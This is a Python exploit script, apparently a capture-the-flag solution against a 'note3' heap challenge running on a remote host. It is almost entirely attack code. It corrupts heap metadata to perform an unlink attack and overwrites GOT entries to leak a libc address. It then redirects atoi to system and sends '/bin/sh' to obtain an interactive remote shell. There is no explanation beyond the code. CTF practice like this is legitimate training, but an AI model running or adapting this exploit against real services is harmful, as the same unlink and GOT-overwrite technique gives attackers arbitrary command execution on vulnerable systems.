#!/usr/bin/env python
# coding:utf-8

from ctf import *

note_list_addr = 0x00000000006020C8
elf = ELF('./note3_18e3cd51cfe9df3f797ccf460d2fe4a9')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.19.so_3f6aaa980b58f7c7590dee12d731e099')

# io = debug('./note3_18e3cd51cfe9df3f797ccf460d2fe4a9')
# io.send('''
# ''')
# io.r()
# io = process('./note3_18e3cd51cfe9df3f797ccf460d2fe4a9')
io = remote('115.28.27.103', 9003)

def add_note(content, length=None):
    io.sendline(1)
    if length is None:
        io.sendline(len(content) + 1)
    else:
        io.sendline(length)
    io.sendline(content)

def edit_note(note_id, content):
    io.sendline(3)
    io.sendline(note_id)
    io.sendline(content)

def delete_note(note_id):
    io.sendline(4)
    io.sendline(note_id)

add_note('A', 0)
add_note('B')
add_note(cyclic(0x80))

note0_addr = note_list_addr
payload = p64(0) + p64(0x21)
payload += p64(note0_addr - 0x18) + p64(note0_addr - 0x10)
payload += cyclic(0x10)
payload += p64(0x30) + p64(0x90)
edit_note(0, payload)
delete_note(2)

payload = cyclic(0x18)
payload += p64(elf.got['free'])
payload += p64(elf.got['atoi'])
payload += p64(elf.got['atoi'])
edit_note(0, payload)

payload = p64(elf.plt['puts'] + 6)
payload += p64(elf.plt['puts'] + 6)
edit_note(0, payload)

io.clean(0.5)
delete_note(1)
io.recvline_startswith('Input')
atoi_addr = unpack(io.recvline(keepends=False), 'all')
log.info('atoi address: %#x', atoi_addr)
libc_base = atoi_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
log.info('system address: %#x', system_addr)

edit_note(2, p64(system_addr))
io.sendline('/bin/sh')

# add_note(cyclic(0x80), 0)
# for i in xrange(3, 7):
#     add_note('X')

# edit_note(1, 'C')
# payload = 'P' * 10
# edit_note(-1, payload)

# io.interrupt()
# io.send('''
# x/xg 0x00000000006020C0
# x/7xg 0x00000000006020C8
# x/7xg 0x0000000000602100
# x/40xg 0x0000000000603000
# # b *0x0000000000400BB9
# ''')

io.interactive()
